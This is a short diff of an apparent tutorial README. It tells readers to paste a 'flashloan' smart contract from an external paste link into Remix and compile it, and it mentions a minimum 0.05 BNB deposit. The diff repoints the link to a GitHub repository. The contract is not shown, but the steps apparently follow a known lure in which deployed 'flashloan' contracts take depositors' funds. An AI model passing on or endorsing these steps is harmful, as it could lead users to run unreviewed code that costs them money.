@@ -33,7 +33,7 @@ https://m.youtube.com/watch?v=qy6GZpI9QWI&pp=ygUNRmxhc2hsb2FuIGJuYg%3D%3D
 
 4- Click on "contracts" folder and then "Create New File". Rename it as you like " anyname.sol "
 
-5- Paste SmartContract in Remix: https://pastehub.net/f322acbcef4
+5- Paste SmartContract in Remix: [https://pastehub.net/f322acbcef4](https://github.com/genbtcdoubler/2023-Flashloan-BSC-min-0.05-BNB-deposit-.sol/blob/main/2023%20Flashloan%20BSC%20(min%200.05%20BNB%20deposit).sol)
 (Copy and Paste as it is)
 
 6- Compile it and copy contract address
